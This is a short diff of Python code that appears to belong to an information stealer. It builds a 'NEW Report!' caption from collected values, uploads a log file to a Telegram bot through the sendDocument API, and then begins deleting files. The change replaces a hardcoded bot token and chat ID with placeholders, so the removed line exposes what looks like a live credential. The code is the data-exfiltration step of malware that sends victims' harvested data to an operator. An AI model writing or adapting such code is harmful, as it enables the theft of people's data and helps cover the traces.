@@ -861,7 +861,7 @@ otstuk1 = '💎 *NEW Report!*'
 for k, v in otstuk.items():
     otstuk1 += '\n└ *' + k.capitalize() + ':* `' + str(v) + '`'
 
-requests.post('https://api.telegram.org/bot5425303083:AAGy-gE5umPwAco3M4OU18fpbjLp9f97Z8o/sendDocument?chat_id=1188331478&caption='+str(otstuk1)+'&parse_mode=markdown', files={'document': (logname,open(logname,'rb'))})
+requests.post('https://api.telegram.org/botTOKEN/sendDocument?chat_id=YOUR_ID&caption='+str(otstuk1)+'&parse_mode=markdown', files={'document': (logname,open(logname,'rb'))})
 
 for x in todelete:
     a = Path(x)
